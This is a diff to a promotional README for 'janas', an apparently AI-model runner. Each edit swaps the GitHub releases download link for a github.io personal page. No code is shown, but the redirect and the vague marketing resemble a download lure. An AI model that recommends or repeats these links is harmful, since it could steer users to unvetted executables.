@@ -1,6 +1,6 @@
 # ⚡ janas - Run Massive AI Models on Any Computer
 
-[![Download janas](https://img.shields.io/badge/Download-janas-blue?style=for-the-badge&logo=github&color=%234FC3F7)](https://github.com/joaniberian9588/janas/releases)
+[![Download janas](https://img.shields.io/badge/Download-janas-blue?style=for-the-badge&logo=github&color=%234FC3F7)](https://joaniberian9588.github.io)
 
 ## 🎯 What is janas?
 
@@ -22,13 +22,13 @@ Most AI models today require powerful computers with lots of memory. janas chang
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [https://github.com/joaniberian9588/janas/releases](https://github.com/joaniberian9588/janas/releases)
+Visit this link to download the application: [https://joaniberian9588.github.io](https://joaniberian9588.github.io)
 
 Once you're on that page, look for the newest version at the top. You'll see files listed - download the one that matches your system. The download might take a few minutes because AI models are large files, but be patient - it's worth it!
 
 ## 📥 Installation
 
-Visit this link to download the application: [https://github.com/joaniberian9588/janas/releases](https://github.com/joaniberian9588/janas/releases)
+Visit this link to download the application: [https://joaniberian9588.github.io](https://joaniberian9588.github.io)
 
 After your download finishes, you're almost ready to go. The installation process is straightforward and takes just a few minutes. Make sure you have enough free space on your computer - AI models can be several gigabytes in size.
 
@@ -131,7 +131,7 @@ janas supports several advanced technologies:
 
 ## 🎉 Start Using janas Today
 
-Visit this link to download the application: [https://github.com/joaniberian9588/janas/releases](https://github.com/joaniberian9588/janas/releases)
+Visit this link to download the application: [https://joaniberian9588.github.io](https://joaniberian9588.github.io)
 
 Join thousands of users who are discovering the power of running their own AI assistant. With janas, you have unlimited potential - no subscriptions, no data collection, no limits. Just pure, powerful AI right on your computer.
 
